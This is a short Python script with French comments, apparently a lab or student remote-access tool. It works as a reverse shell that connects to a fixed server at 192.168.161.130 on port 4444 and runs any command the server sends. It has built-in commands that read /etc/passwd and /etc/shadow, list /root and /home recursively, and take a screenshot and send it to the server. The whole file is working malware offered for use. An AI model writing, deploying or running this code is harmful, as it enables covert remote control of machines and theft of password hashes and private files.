import socket
import subprocess
import os



SERVER_IP = "192.168.161.130" # À changer par l'IP du serveur si besoin
SERVER_PORT = 4444

def execute_cmd(cmd):
    try:
        res = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        return res.stdout + res.stderr
    except Exception as e:
        return str(e)

def main():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.connect((SERVER_IP, SERVER_PORT))
        local_ip = sock.getsockname()[0]
        sock.send(f"{socket.gethostname()} - {local_ip} - Linux".encode())
    except Exception as e:
        print(f"Erreur de connexion : {e}")
        return

    while True:
        cmd = sock.recv(4096).decode('utf-8').strip()
        if not cmd or cmd == "exit":
            break

        # --- Tes commandes spécifiques Linux ---
        if cmd == "passwd":
            resultat = execute_cmd("cat /etc/passwd")
        elif cmd == "shadow":
            resultat = execute_cmd("cat /etc/shadow")
        elif cmd == "list_root":
            resultat = execute_cmd("ls -laR /root")
        elif cmd == "list_home":
            resultat = execute_cmd("ls -laR /home")
            
        # --- La capture d'écran ---
        elif cmd == "screenshot":
            os.system("scrot /tmp/screen.png")
            with open("/tmp/screen.png", "rb") as f:
                sock.send(f.read())
            continue  # <-- Permet de passer à la suite sans envoyer de texte
            
        # --- Commandes normales ---
        else:
            resultat = execute_cmd(cmd)

        # On envoie le résultat (seulement pour le texte)
        sock.send(resultat.encode())

    sock.close()

if __name__ == "__main__":
    main()
